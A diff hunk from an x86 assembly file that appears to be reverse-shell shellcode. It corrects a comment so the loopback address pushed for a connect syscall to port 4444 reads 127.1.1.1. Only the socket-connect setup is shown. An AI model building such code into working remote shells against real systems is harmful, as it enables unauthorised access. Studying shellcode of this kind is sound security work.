@@ -26,7 +26,7 @@ _start:
 	xor eax, eax
 	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect
 
-	push 0x0101017f		; connect to localhost (127.0.0.1) (little endian)
+	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
 	
 	push word 0x5c11	; connect to port 4444 (little endian)
 	
